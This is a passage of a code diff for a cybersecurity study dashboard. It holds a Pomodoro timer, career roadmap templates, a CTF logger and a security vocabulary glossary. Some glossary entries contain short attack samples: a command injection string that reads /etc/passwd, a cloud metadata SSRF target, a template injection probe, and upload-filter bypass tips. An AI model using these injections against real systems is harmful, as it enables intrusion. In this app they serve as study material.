+  clearInterval(pomoState.interval);
+  pomoState.running = false;
+  // Always skip to short break from focus (unless after every 4 completed sessions → long break)
+  if (pomoState.mode === 'focus') {
+    const nextIsLong = pomoState.session > 0 && pomoState.session % 4 === 0;
+    setPomoMode(nextIsLong ? 'long' : 'short');
+  } else {
+    setPomoMode('focus');
+  }
+  document.getElementById('pomoPlayBtn').innerHTML = '▶';
+}
+function logPomoSession(mins) {
+  store.pomoLog.unshift({ time: new Date().toLocaleTimeString(), date: new Date().toLocaleDateString(), duration: mins, session: pomoState.session });
+  if (store.pomoLog.length > 50) store.pomoLog = store.pomoLog.slice(0,50);
+  save(); renderPomoLog();
+}
+function renderPomoLog() { /* log UI removed */ }
+function playBeep() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.frequency.value = 880;
+    gain.gain.setValueAtTime(0.3, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime+0.8);
+    osc.start(); osc.stop(ctx.currentTime+0.8);
+  } catch(e) {}
+}
+
+function updatePomoSettings() {
+  const work = parseInt(document.getElementById('setWork').value) || 25;
+  const short = parseInt(document.getElementById('setShort').value) || 5;
+  const long = parseInt(document.getElementById('setLong').value) || 15;
+  POMO_DURATIONS.focus = work * 60;
+  POMO_DURATIONS.short = short * 60;
+  POMO_DURATIONS.long = long * 60;
+  if (!pomoState.running) setPomoMode(pomoState.mode);
+}
+
+let manualPhases = [];
+let activeRmId = null;
+
+const RM_TEMPLATES = [
+  { title:'Penetration Tester / Junior Pentester', emoji:'🗡', phases:[
+    {label:'Month 1-2',title:'Core Foundations',tasks:['Networking: TCP/IP, OSI, DNS, HTTP, ARP, routing','Linux command line mastery (OverTheWire Bandit)','Python scripting for security automation','Set up Kali Linux hacking lab in VirtualBox','Study OWASP Top 10 in depth','Complete TryHackMe Pre-Security path']},
+    {label:'Month 3-4',title:'Web Pentesting',tasks:['Burp Suite: proxy, intruder, repeater, scanner','SQLi: manual and sqlmap automation','XSS: reflected, stored, DOM-based exploitation','SSRF, XXE, IDOR, file upload bypasses','PortSwigger Web Academy - complete all labs','Practice on HackTheBox web challenges']},
+    {label:'Month 5-6',title:'Network & Infrastructure',tasks:['Nmap: all scan types, NSE scripts, OS detection','SMB/RPC/LDAP enumeration techniques','Metasploit framework: search, use, exploit, post','Privilege escalation: Linux SUID/sudo, Windows services','Active Directory basics: enumeration, Kerberoasting','VPN, firewall evasion, pivoting with chisel']},
+    {label:'Month 7-8',title:'Report Writing & Methodology',tasks:['Learn PTES and OWASP testing methodology','Write professional pentest reports','CVSS scoring for each finding','Executive summary vs technical findings','Remediation recommendations writing','Practice writing reports for every HTB/THM box']},
+    {label:'Month 9-10',title:'Certifications',tasks:['eJPT (beginner - highly recommended first)','CompTIA PenTest+ (intermediate)','OSCP (advanced - the gold standard)','TCM Security PNPT (practical alternative)','Build public GitHub portfolio of tools/scripts','Start applying for junior pentester roles']},
+  ]},
+  { title:'SOC Analyst / Cyber Defence', emoji:'🛡', phases:[
+    {label:'Month 1',title:'Security Fundamentals',tasks:['CIA triad, AAA, defense in depth','Common attack types: phishing, malware, ransomware, APT','Windows Event logs: 4624, 4625, 4688, 4698, 4776','Syslog format and Linux log locations','Network protocols deep dive: DNS, HTTP, SMTP, SMB','MITRE ATT&CK framework - learn all tactics']},
+    {label:'Month 2',title:'SIEM & Detection',tasks:['Splunk fundamentals: search, stats, alerts, dashboards','ELK Stack: Elasticsearch, Logstash, Kibana setup','Write detection rules for common attacks','Snort/Suricata IDS rule syntax','Zeek/Bro network security monitoring','Set up home detection lab with Sysmon']},
+    {label:'Month 3',title:'Incident Response',tasks:['IR lifecycle: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned','Malware analysis: static (strings, PEStudio) and dynamic (Any.run)','Memory forensics with Volatility3','Network PCAP analysis with Wireshark/NetworkMiner','Containment and remediation procedures','Write IR playbooks for common scenarios']},
+    {label:'Month 4',title:'Threat Intel & Hunting',tasks:['MISP threat intelligence platform','OpenCTI and AlienVault OTX feeds','Create detection hypotheses from threat intel','Threat hunting with Splunk or ELK','IOC management and enrichment','Understand diamond model of intrusion analysis']},
+    {label:'Month 5',title:'Certs & Job Hunt',tasks:['CompTIA Security+ (baseline requirement)','CompTIA CySA+ (analyst-focused)','TryHackMe SOC Level 1 path completion','Blue Team Labs Online practice','BTL1 certification (Blue Team Labs Level 1)','Apply for L1/L2 SOC analyst positions']},
+  ]},
+  { title:'Bug Bounty Hunter', emoji:'💰', phases:[
+    {label:'Month 1-2',title:'Web Security Mastery',tasks:['Complete all PortSwigger Web Security Academy labs','XSS, SQLi, SSRF, IDOR, XXE, SSTI deep dives','HTTP request smuggling and deserialization','OAuth and JWT attack vectors','Burp Suite Pro features: scanner, collaborator','JavaScript analysis for hidden endpoints']},
+    {label:'Month 3',title:'Recon Methodology',tasks:['Passive recon: Shodan, Censys, Certificate Transparency','Subdomain enumeration: Subfinder, Amass, Assetfinder','Port scanning with Rustscan + Nmap pipeline','Content discovery with ffuf/feroxbuster','Google dorks for target-specific findings','Build automated recon pipeline with bash']},
+    {label:'Month 4',title:'API & Mobile Security',tasks:['REST API testing methodology','GraphQL introspection and injection attacks','Android app testing with Jadx, APKTool','iOS basics: class-dump, Frida for dynamic analysis','Postman and mitmproxy for API interception','Find IDOR/auth bypass in API endpoints']},
+    {label:'Month 5',title:'Platform Strategy',tasks:['Create HackerOne, Bugcrowd, Intigriti accounts','Start with private programs (invited or low-comp)','Choose beginner-friendly public programs','Write clear, detailed bug reports with PoC','Learn safe harbor and disclosure policies','Engage with community (Discord, Twitter, blogs)']},
+    {label:'Month 6',title:'Level Up',tasks:['Chain multiple low bugs into high-severity report','Learn source-assisted testing (open source targets)','Study disclosed reports on HackerOne/Bugcrowd','Specialize in a niche: cloud, mobile, OAuth','Track your unique findings and methodology','Build portfolio and reputation on platform']},
+  ]},
+  { title:'Cloud Security Engineer', emoji:'☁', phases:[
+    {label:'Month 1-2',title:'Cloud Fundamentals',tasks:['AWS core services: EC2, S3, IAM, VPC, Lambda, RDS','Azure fundamentals: VMs, Active Directory, Defender','GCP basics: GKE, IAM, Cloud Security Command Center','Shared responsibility model for each provider','Terraform IaC basics for cloud deployments','AWS Solutions Architect Associate certification path']},
+    {label:'Month 3',title:'IAM & Identity Security',tasks:['AWS IAM policies: resource, condition, principal','Privilege escalation via misconfigured IAM roles','Cross-account access and role assumption','Secrets Manager, Parameter Store, KMS encryption','Service control policies in AWS Organizations','Federation: SAML, OIDC, Cognito identity pools']},
+    {label:'Month 4',title:'Cloud Attack Techniques',tasks:['SSRF to AWS/Azure/GCP metadata endpoints','S3 bucket misconfiguration: public access, ACLs','EBS snapshot exposure and data extraction','Lambda function abuse and event injection','CloudGoat (Rhino Security Labs) attack labs','Pacu framework for AWS post-exploitation']},
+    {label:'Month 5',title:'Detection & Hardening',tasks:['CloudTrail analysis and alerting on suspicious API calls','GuardDuty threat detection and custom threat lists','AWS Security Hub for compliance standards','Azure Sentinel/Microsoft Defender for Cloud','CIS Benchmarks for AWS, Azure, GCP','Container security: ECR scanning, EKS security']},
+    {label:'Month 6',title:'Certs & Career',tasks:['AWS Security Specialty certification','Azure Security Engineer Associate (AZ-500)','Google Professional Cloud Security Engineer','Certified Cloud Security Professional (CCSP)','Build cloud security portfolio on GitHub','Apply for cloud security engineer / architect roles']},
+  ]},
+  { title:'Malware Analyst / Reverse Engineer', emoji:'🦠', phases:[
+    {label:'Month 1-2',title:'Prerequisites',tasks:['Assembly language (x86/x64): registers, stack, instructions','C programming fundamentals for low-level understanding','Windows internals: processes, DLLs, PE format, registry','Linux ELF binary format understanding','Set up safe malware analysis VM (FlareVM / REMnux)','Python for automation and script writing']},
+    {label:'Month 3',title:'Static Analysis',tasks:['PEStudio: PE header analysis, imports, strings','Detect-It-Easy for file type and packer identification','strings command for quick artifact extraction','Capa for automated capability detection','IDA Pro or Ghidra disassembly and decompilation','Recognize common API calls: CreateProcess, VirtualAlloc']},
+    {label:'Month 4',title:'Dynamic Analysis',tasks:['Process Monitor (ProcMon) for file/registry activity','Process Explorer for process relationships','Wireshark for network traffic analysis','x64dbg/OllyDbg for debugging and patching','Regshot for registry changes before/after execution','Any.run and Cuckoo Sandbox for automated analysis']},
+    {label:'Month 5',title:'Advanced Topics',tasks:['Unpacking packed malware manually','Anti-analysis tricks: anti-VM, anti-debug, timing checks','Code injection: process hollowing, DLL injection','Persistence mechanisms: registry, scheduled tasks, services','Rootkit detection techniques','Deobfuscating PowerShell and .NET malware']},
+    {label:'Month 6',title:'Certs & Practice',tasks:['FLARE-ON CTF challenges (annual, excellent practice)','Malware Traffic Analysis (.pcap exercises)','GREM - GIAC Reverse Engineering Malware cert','Zero2Automated malware analysis course','Write detailed malware analysis reports','Publish blog posts / reports on analyzed samples']},
+  ]},
+  { title:'Digital Forensics & Incident Response (DFIR)', emoji:'🔬', phases:[
+    {label:'Month 1-2',title:'Forensics Foundations',tasks:['Digital evidence principles: preservation, chain of custody','Windows forensic artifacts: prefetch, LNK, registry hives','Browser forensics: history, cookies, cache artifacts','$MFT, $LogFile, $UsnJrnl filesystem artifacts','Email header analysis and phishing investigation','FTK Imager for disk imaging and evidence preservation']},
+    {label:'Month 3',title:'Memory & Disk Forensics',tasks:['Volatility3 for Windows/Linux memory analysis','pslist, netscan, malfind, dumpfiles plugins','Autopsy for disk image analysis and timeline','Sleuth Kit command line tools: fls, icat, mmls','Recover deleted files and carved artifacts','Registry hive analysis: SAM, SYSTEM, SOFTWARE, NTUSER']},
+    {label:'Month 4',title:'Network Forensics',tasks:['Wireshark deep packet inspection','NetworkMiner for session reconstruction','Zeek/Bro log analysis for threat hunting','Suricata alert analysis and tuning','DNS log analysis for C2 detection','Reconstruct attacker timeline from network logs']},
+    {label:'Month 5',title:'Incident Response',tasks:['IR lifecycle: PICERL methodology','Build IR playbooks for ransomware, phishing, insider threat','Collect and preserve volatile data (RAM, running processes)','Endpoint triage with Velociraptor or CrowdStrike','Remediation: isolate, eradicate, recover','Lessons learned and post-incident reporting']},
+    {label:'Month 6',title:'Certs & Career',tasks:['CompTIA Security+ (baseline)','GCFE - GIAC Certified Forensic Examiner','GCIH - GIAC Certified Incident Handler','GCFA - GIAC Certified Forensic Analyst','Magnet Forensics AXIOM practice','Apply for DFIR analyst / IR consultant roles']},
+  ]},
+  { title:'AppSec / Product Security Engineer', emoji:'🔐', phases:[
+    {label:'Month 1-2',title:'Secure Development Foundations',tasks:['OWASP Top 10 and OWASP ASVS in depth','Common vulnerability classes: injection, broken auth, misconfig','SAST concept: code review for security bugs','DAST: automated dynamic scanning with ZAP/Burp','Threat modeling: STRIDE, PASTA, attack trees','Security requirements and abuse stories in Agile']},
+    {label:'Month 3',title:'Code Review & SAST',tasks:['Manual secure code review: PHP, Java, Python, Node.js','Semgrep for custom SAST rule writing','SonarQube for CI/CD security integration','Identify insecure deserialization, path traversal, XXE in code','Dependency scanning with Snyk, OWASP Dependency-Check','Secrets detection: GitLeaks, truffleHog']},
+    {label:'Month 4',title:'DAST & API Security',tasks:['OWASP API Security Top 10','REST and GraphQL API security testing','Authentication: OAuth 2.0 flows and common misconfigs','JWT security: algorithm confusion, weak secret brute force','Postman collection for API security testing','Integrate DAST into CI/CD pipeline']},
+    {label:'Month 5',title:'DevSecOps & Pipeline Security',tasks:['Shift-left security: integrate security in SDLC','GitHub Actions / Jenkins security pipeline setup','Container security: Dockerfile hardening, image scanning','Infrastructure as Code security: Terrascan, Checkov','Supply chain security: SBOM, Sigstore, SLSA framework','Security champions program implementation']},
+    {label:'Month 6',title:'Certs & Career Path',tasks:['CSSLP - Certified Secure Software Lifecycle Professional','GWEB - GIAC Web Application Defender','BSCP - Burp Suite Certified Practitioner','Contribute to open source security tooling','Build AppSec portfolio: CVEs found, tools, blog','Apply for AppSec engineer / product security roles']},
+  ]},
+  { title:'Threat Intelligence Analyst', emoji:'🕵', phases:[
+    {label:'Month 1-2',title:'Intelligence Foundations',tasks:['Intelligence cycle: Direction, Collection, Processing, Analysis, Dissemination','Threat actor types: nation-state, cybercrime, hacktivism, insider','MITRE ATT&CK navigator and technique mapping','Diamond model of intrusion analysis','STIX/TAXII formats for threat intelligence sharing','Set up MISP threat intelligence platform']},
+    {label:'Month 3',title:'OSINT & Collection',tasks:['Passive DNS and certificate transparency monitoring','Social media intelligence: Twitter/X, Telegram, forums','Dark web monitoring techniques and tools','Shodan, Censys for infrastructure tracking','Maltego for link analysis and pivoting','Track threat actor infrastructure and TTPs']},
+    {label:'Month 4',title:'Malware & Campaign Analysis',tasks:['Malware family identification and classification','Yara rule writing for malware detection','VirusTotal, MalwareBazaar, Any.run analysis','Campaign attribution methodology','IOC extraction: hashes, IPs, domains, mutex names','Threat intel reporting formats (OSINT reports, advisory)']},
+    {label:'Month 5',title:'Threat Hunting',tasks:['Hypothesis-based hunting methodology','Hunting with Splunk: correlation searches','Hunting with ELK: KQL queries','Behavioral analytics and anomaly detection','ATT&CK technique hunting queries library','Build detection content from threat intel']},
+    {label:'Month 6',title:'Certs & Career',tasks:['GCTI - GIAC Cyber Threat Intelligence certification','OpenCTI platform mastery','Recorded Future Intelligence certification','Write public threat intelligence reports','Engage with CTI sharing communities (ISACs)','Apply for CTI analyst / threat intel engineer roles']},
+  ]},
+  { title:'Network Security Engineer', emoji:'🌐', phases:[
+    {label:'Month 1-2',title:'Networking Deep Dive',tasks:['OSI/TCP-IP model at packet level','IP routing, BGP, OSPF, EIGRP protocols','VLANs, trunking, spanning tree protocol','Wireshark capture and analysis mastery','Subnetting and CIDR notation mastery','GNS3 or Cisco Packet Tracer lab setup']},
+    {label:'Month 3',title:'Firewall & Perimeter',tasks:['Cisco ASA and Firepower configuration','Palo Alto NGFW policy management','pfSense/OPNsense open source firewalls','DMZ design and segmentation principles','NAT, PAT, and access-list design','IDS/IPS: Snort and Suricata deployment and tuning']},
+    {label:'Month 4',title:'VPN & Secure Access',tasks:['IPSec VPN: IKEv1/v2, phases, transforms','SSL VPN: Cisco AnyConnect, GlobalProtect','Zero Trust Network Access (ZTNA) concepts','MFA integration with network access','NAC: Network Access Control with 802.1X/RADIUS','SD-WAN security fundamentals']},
+    {label:'Month 5',title:'Network Security Monitoring',tasks:['NetFlow/IPFIX for traffic baselining','Zeek/Bro for deep network inspection','Full packet capture with Security Onion','PCAP analysis for threat hunting','DNS security: RPZ, DNSSEC, DNS logging','Email security: SPF, DKIM, DMARC configuration']},
+    {label:'Month 6',title:'Certs & Career',tasks:['Cisco CCNA (strong network foundation)','Cisco CCNP Security','CompTIA Network+','Palo Alto PCNSA certification','Build home network security lab','Apply for network security engineer / architect roles']},
+  ]},
+  { title:'GRC / Compliance Analyst', emoji:'📋', phases:[
+    {label:'Month 1-2',title:'Compliance Frameworks',tasks:['ISO 27001: ISMS structure, Annex A controls','NIST CSF: Identify, Protect, Detect, Respond, Recover','SOC 2 Type I/II: Trust Service Criteria','PCI-DSS: 12 requirements for payment card security','HIPAA: Technical, administrative, physical safeguards','GDPR: data subject rights, DPO, breach notification']},
+    {label:'Month 3',title:'Risk Management',tasks:['Risk assessment methodology: identify, analyze, evaluate','Qualitative vs quantitative risk analysis','Risk register creation and maintenance','Risk treatment: accept, avoid, transfer, mitigate','Business impact analysis (BIA)','Third-party vendor risk assessment']},
+    {label:'Month 4',title:'Policy & Audit',tasks:['Security policy framework development','Acceptable use, access control, incident response policies','Internal audit preparation and evidence collection','GAP analysis against frameworks','Security awareness training programs','Control testing and remediation tracking']},
+    {label:'Month 5',title:'Tools & Automation',tasks:['GRC tools: ServiceNow GRC, RSA Archer, OneTrust','Cloud compliance: AWS Config, Azure Policy, GCP SCC','Vulnerability management program management','Evidence collection automation','Metrics and KPI dashboard creation','Continuous compliance monitoring setup']},
+    {label:'Month 6',title:'Certs & Career',tasks:['CompTIA Security+ (baseline)','CISA - Certified Information Systems Auditor','CISM - Certified Information Security Manager','CISSP (advanced, 5 years experience required)','ISO 27001 Lead Implementer certification','Apply for GRC analyst / compliance engineer / ISSO roles']},
+  ]},
+];
+
+function openTemplateModal() {
+  const grid = document.getElementById('templateGrid');
+  grid.innerHTML = RM_TEMPLATES.map(function(t, i) {
+    return '<div class="card" style="cursor:pointer;transition:all 0.2s;" onmouseenter="this.style.borderColor=\'var(--accent)\'" onmouseleave="this.style.borderColor=\'var(--border)\'" onclick="useTemplate(' + i + ')"><div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;"><span style="font-size:24px;">' + t.emoji + '</span><div><div class="font-orb" style="font-size:12px;color:var(--text);">' + escH(t.title) + '</div><div class="font-mono text-muted" style="font-size:10px;margin-top:2px;">' + t.phases.length + ' PHASES</div></div></div></div>';
+  }).join('');
+  openModal('templateModal');
+}
+function useTemplate(i) {
+  const t = RM_TEMPLATES[i];
+  store.roadmaps.unshift({ id: Date.now(), title: t.title, phases: JSON.parse(JSON.stringify(t.phases)), progress:{}, created: new Date().toLocaleDateString(), fromTemplate: true });
+  save(); closeModal('templateModal'); renderRoadmapList(); toast('> ROADMAP ADDED');
+}
+function openManualRoadmapModal() {
+  manualPhases = [];
+  document.getElementById('manualRmTitle').value = '';
+  document.getElementById('manualPhases').innerHTML = '';
+  addManualPhase();
+  openModal('manualRoadmapModal');
+}
+function addManualPhase() {
+  manualPhases.push({ label:'', title:'', tasks:[''] });
+  renderManualPhases();
+}
+function renderManualPhases() {
+  document.getElementById('manualPhases').innerHTML = manualPhases.map(function(p, i) {
+    return '<div style="background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:14px;margin-bottom:10px;"><div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;"><input type="text" placeholder="Label (e.g. Month 1)" value="' + escH(p.label) + '" oninput="manualPhases[' + i + '].label=this.value" style="flex:0 0 160px;"><input type="text" placeholder="Phase title" value="' + escH(p.title) + '" oninput="manualPhases[' + i + '].title=this.value" style="flex:1;"><button class="btn btn-red btn-sm" onclick="removeManualPhase(' + i + ')">X</button></div>' + p.tasks.map(function(t, ti) { return '<div style="display:flex;gap:6px;margin-bottom:5px;"><input type="text" placeholder="Task ' + (ti+1) + '..." value="' + escH(t) + '" oninput="manualPhases[' + i + '].tasks[' + ti + ']=this.value" style="flex:1;font-size:12px;"><button class="icon-btn" onclick="removeManualTask(' + i + ',' + ti + ')">X</button></div>'; }).join('') + '<button class="btn btn-ghost btn-sm" onclick="addManualTask(' + i + ')" style="margin-top:4px;font-size:11px;">+ TASK</button></div>';
+  }).join('');
+}
+function removeManualPhase(i) { manualPhases.splice(i,1); renderManualPhases(); }
+function addManualTask(i) { manualPhases[i].tasks.push(''); renderManualPhases(); }
+function removeManualTask(i, ti) { manualPhases[i].tasks.splice(ti,1); renderManualPhases(); }
+function saveManualRoadmap() {
+  const title = document.getElementById('manualRmTitle').value.trim();
+  if (!title) { toast('> title required','#ff4d6d'); return; }
+  const phases = manualPhases.filter(function(p) { return p.title || p.tasks.some(function(t){ return t.trim(); }); }).map(function(p) { return { label:p.label, title:p.title, tasks:p.tasks.filter(function(t){ return t.trim(); }) }; });
+  if (!phases.length) { toast('> add at least one phase','#ff4d6d'); return; }
+  store.roadmaps.unshift({ id:Date.now(), title, phases, progress:{}, created: new Date().toLocaleDateString() });
+  save(); closeModal('manualRoadmapModal'); renderRoadmapList(); toast('> ROADMAP SAVED');
+}
+function renderRoadmapList() {
+  const grid = document.getElementById('rmGrid');
+  if (!grid) return;
+  if (!store.roadmaps.length) {
+    grid.innerHTML = '<div class="empty-state"><div class="empty-icon">🗺</div><div>NO ROADMAPS YET</div><div style="margin-top:8px;font-size:11px;color:#3d5a6a;">Pick a template or build your own manually</div></div>';
+    return;
+  }
+  grid.innerHTML = store.roadmaps.map(function(rm) {
+    const total = rm.phases.reduce(function(a,p){ return a+(p.tasks||[]).length; }, 0);
+    const done = Object.values(rm.progress||{}).filter(Boolean).length;
+    const pct = total ? Math.round(done/total*100) : 0;
+    const badge = rm.fromTemplate ? '<span class="tag tag-blue" style="font-size:9px;">TEMPLATE</span>' : '<span class="tag tag-green" style="font-size:9px;">CUSTOM</span>';
+    return '<div class="card" style="cursor:pointer;transition:all 0.2s;margin-bottom:14px;" onmouseenter="this.style.borderColor=\'var(--accent2)\'" onmouseleave="this.style.borderColor=\'var(--border)\'" onclick="openRoadmap(' + rm.id + ')"><div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px;"><div><div class="font-orb" style="font-size:15px;color:var(--text);margin-bottom:4px;">' + escH(rm.title) + '</div><div style="display:flex;gap:6px;align-items:center;">' + badge + '<span class="font-mono text-muted" style="font-size:10px;">' + rm.phases.length + ' PHASES &nbsp;·&nbsp; ' + total + ' TASKS &nbsp;·&nbsp; ' + rm.created + '</span></div></div><div style="text-align:right;"><div class="font-orb" style="font-size:22px;color:' + (pct===100?'var(--accent)':'var(--accent4)') + ';">' + pct + '%</div><div class="font-mono text-muted" style="font-size:10px;">' + done + '/' + total + ' DONE</div></div></div><div class="habit-progress-bar"><div class="habit-progress-fill" style="width:' + pct + '%;background:linear-gradient(90deg,var(--accent),var(--accent2))"></div></div></div>';
+  }).join('');
+}
+function openRoadmap(id) {
+  activeRmId = id;
+  const rm = store.roadmaps.find(function(r){ return r.id===id; });
+  document.getElementById('rmListView').style.display = 'none';
+  document.getElementById('rmDetailView').style.display = 'block';
+  document.getElementById('rmDetailTitle').textContent = rm.title;
+  document.getElementById('rmDeleteBtn').onclick = function(){ deleteRoadmap(id); };
+  renderRoadmapDetail(rm);
+}
+function backToRoadmapList() {
+  document.getElementById('rmListView').style.display = '';
+  document.getElementById('rmDetailView').style.display = 'none';
+  activeRmId = null;
+}
+function deleteRoadmap(id) {
+  store.roadmaps = store.roadmaps.filter(function(r){ return r.id!==id; });
+  save(); backToRoadmapList(); renderRoadmapList(); toast('> ROADMAP DELETED','#ff4d6d');
+}
+function renderRoadmapDetail(rm) {
+  const total = rm.phases.reduce(function(a,p){ return a+(p.tasks||[]).length; },0);
+  const done = Object.values(rm.progress||{}).filter(Boolean).length;
+  const pct = total ? Math.round(done/total*100) : 0;
+  document.getElementById('rmDetailProgress').innerHTML = '<div class="card" style="display:flex;align-items:center;gap:20px;padding:14px 20px;"><div class="font-orb" style="font-size:32px;color:' + (pct===100?'var(--accent)':'var(--accent4)') + ';">' + pct + '%</div><div style="flex:1"><div class="habit-progress-bar" style="height:8px;"><div class="habit-progress-fill" style="width:' + pct + '%;"></div></div><div class="font-mono text-muted mt-8" style="font-size:11px;">' + done + ' OF ' + total + ' TASKS COMPLETED</div></div>' + (pct===100?'<div style="font-size:24px;">🎉</div>':'') + '</div>';
+  const phaseColors = ['var(--accent)','var(--accent2)','var(--accent4)','#a855f7','var(--accent3)','#06b6d4','#f97316','#84cc16'];
+  document.getElementById('rmDetailContent').innerHTML = rm.phases.map(function(p, pi) {
+    const col = phaseColors[pi % phaseColors.length];
+    return '<div class="roadmap-phase" style="--phase-col:' + col + '"><div class="phase-header">' + (p.label ? '<span class="phase-time" style="border-color:' + col + '33;background:' + col + '11;color:' + col + ';">' + escH(p.label) + '</span>' : '') + '<span class="phase-title">' + escH(p.title) + '</span></div><ul class="phase-tasks">' + (p.tasks||[]).map(function(t, ti) { const key = rm.id + '_' + pi + '_' + ti; const isDone = !!(rm.progress||{})[key]; return '<li class="phase-task ' + (isDone?'done':'') + '" onclick="toggleRmTask(' + rm.id + ',\'' + key + '\',this)"><div class="task-check" style="' + (isDone ? 'background:' + col + '22;border-color:' + col + ';color:' + col : '') + '">' + (isDone?'✓':'') + '</div><span>' + escH(t) + '</span></li>'; }).join('') + '</ul><div style="position:absolute;left:-24px;top:8px;width:10px;height:10px;border-radius:50%;background:' + col + ';border:2px solid var(--bg);box-shadow:0 0 8px ' + col + ';"></div></div>';
+  }).join('');
+}
+function toggleRmTask(rmId, key, el) {
+  const rm = store.roadmaps.find(function(r){ return r.id===rmId; });
+  if (!rm.progress) rm.progress = {};
+  rm.progress[key] = !rm.progress[key];
+  save();
+  el.classList.toggle('done', rm.progress[key]);
+  el.querySelector('.task-check').textContent = rm.progress[key] ? '✓' : '';
+  renderRoadmapDetail(rm);
+}
+
+// =================== CTF ===================
+function addCTF() {
+  const name = document.getElementById('ctfName').value.trim();
+  if (!name) { toast('> name required','#ff4d6d'); return; }
+  store.ctf.unshift({ id:Date.now(), name, platform:document.getElementById('ctfPlatform').value, diff:document.getElementById('ctfDiff').value, points:parseInt(document.getElementById('ctfPoints').value)||0, cat:document.getElementById('ctfCategory').value, notes:document.getElementById('ctfNotes').value.trim(), date:new Date().toLocaleDateString() });
+  document.getElementById('ctfName').value='';
+  document.getElementById('ctfPoints').value='';
+  document.getElementById('ctfNotes').value='';
+  save(); renderCTF(); toast('> CTF LOGGED 🏴');
+}
+function deleteCTF(id) { store.ctf = store.ctf.filter(function(c){ return c.id!==id; }); save(); renderCTF(); }
+function renderCTF() {
+  const totalPoints = store.ctf.reduce(function(a,c){ return a+c.points; },0);
+  const hard = store.ctf.filter(function(c){ return c.diff==='hard'; }).length;
+  document.getElementById('ctfStats').innerHTML = '<div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent)">' + store.ctf.length + '</div><div class="ctf-stat-label">SOLVED</div></div><div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent4)">' + totalPoints + '</div><div class="ctf-stat-label">TOTAL POINTS</div></div><div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent3)">' + hard + '</div><div class="ctf-stat-label">HARD</div></div><div class="ctf-stat"><div class="ctf-stat-num" style="color:var(--accent2)">' + [...new Set(store.ctf.map(function(c){ return c.platform; }))].length + '</div><div class="ctf-stat-label">PLATFORMS</div></div>';
+  const list = document.getElementById('ctfList');
+  if (!store.ctf.length) { list.innerHTML='<div class="empty-state"><div class="empty-icon">🏴</div>NO CTFs LOGGED YET</div>'; return; }
+  const catColors = {Web:'tag-red',Network:'tag-blue',Crypto:'tag-gold',Forensics:'tag-green',Pwn:'tag-red',OSINT:'tag-blue',Misc:'tag-blue'};
+  list.innerHTML = store.ctf.map(function(c){ return '<div class="ctf-item"><div><div class="ctf-item-name">' + escH(c.name) + '</div><div class="text-muted font-mono" style="font-size:10px;margin-top:2px;">' + c.date + ' | ' + c.platform + '</div>' + (c.notes ? '<div style="font-size:12px;color:var(--text2);margin-top:4px;">' + escH(c.notes) + '</div>' : '') + '</div><div class="ctf-item-meta"><span class="tag ' + (catColors[c.cat]||'tag-blue') + '">' + c.cat + '</span><span class="ctf-difficulty diff-' + c.diff + '">' + c.diff.toUpperCase() + '</span><span class="ctf-points">' + c.points + 'pts</span><button class="icon-btn" onclick="deleteCTF(' + c.id + ')">🗑</button></div></div>'; }).join('');
+}
+
+// =================== VOCAB ===================
+function getDefaultVocab() {
+  return [
+    {id:1,term:'SQL Injection',def:'Attacker inserts malicious SQL into input fields to manipulate the database. Types: classic, blind, time-based, out-of-band.',cat:'web'},
+    {id:2,term:'XSS (Cross-Site Scripting)',def:'Injecting malicious JavaScript into web pages. Reflected (URL), Stored (DB), DOM-based. Steals cookies and sessions.',cat:'web'},
+    {id:3,term:'IDOR',def:'Insecure Direct Object Reference - accessing resources by changing IDs (e.g. /user/123 to /user/124) without authorization.',cat:'web'},
+    {id:4,term:'CSRF',def:'Cross-Site Request Forgery - tricks authenticated user into executing unwanted actions by forging requests from another site.',cat:'web'},
+    {id:5,term:'SSRF',def:'Server-Side Request Forgery - forces server to make HTTP requests to internal resources. Key target: AWS metadata 169.254.169.254.',cat:'web'},
+    {id:6,term:'XXE Injection',def:'XML External Entity - abusing XML parsers to read local files or perform SSRF. Inject external entity in XML input.',cat:'web'},
+    {id:7,term:'File Upload Vulnerability',def:'Uploading malicious files (PHP webshells) by bypassing extension checks. Try double extensions (.php.jpg), magic bytes bypass.',cat:'web'},
+    {id:8,term:'Directory Traversal',def:'Using ../ sequences to navigate outside web root and read sensitive files like /etc/passwd. Also called path traversal.',cat:'web'},
+    {id:9,term:'Command Injection',def:'Injecting OS commands through vulnerable input. e.g. ping 8.8.8.8; cat /etc/passwd. Separators: ; | && ||',cat:'web'},
+    {id:10,term:'Open Redirect',def:'Redirecting users to external malicious sites via vulnerable redirect parameters. Used in phishing attacks.',cat:'web'},
+    {id:11,term:'HTTP Request Smuggling',def:'Manipulating how front-end and back-end servers interpret HTTP request boundaries to bypass security controls.',cat:'web'},
+    {id:12,term:'OWASP Top 10',def:'The 10 most critical web security risks. Must-know for any web hacker. Updated every few years by OWASP foundation.',cat:'web'},
+    {id:13,term:'JWT Attack',def:'JSON Web Token vulnerabilities: alg:none attack, weak secret brute force, kid injection. Use jwt.io to decode tokens.',cat:'web'},
+    {id:14,term:'SSTI',def:'Server-Side Template Injection - inject template syntax {{7*7}} to achieve RCE. Common in Jinja2, Twig, Freemarker.',cat:'web'},
+    {id:15,term:'CORS Misconfiguration',def:'Cross-Origin Resource Sharing misconfiguration allows attacker origins to make credentialed requests and steal data.',cat:'web'},
+    {id:16,term:'Clickjacking',def:'Trick users into clicking invisible overlaid elements. Attacker embeds target site in iframe. Fixed with X-Frame-Options header.',cat:'web'},
+    {id:17,term:'HTTP Verb Tampering',def:'Using unexpected HTTP methods (PUT, DELETE, PATCH) to bypass access controls or trigger unintended behavior.',cat:'web'},
+    {id:18,term:'Mass Assignment',def:'When API automatically assigns all request parameters to model objects, allowing attackers to set unintended fields like isAdmin.',cat:'web'},
+    {id:19,term:'Race Condition',def:'Exploiting timing gaps between checking and using a value. Classic example: withdraw money twice before balance updates.',cat:'web'},
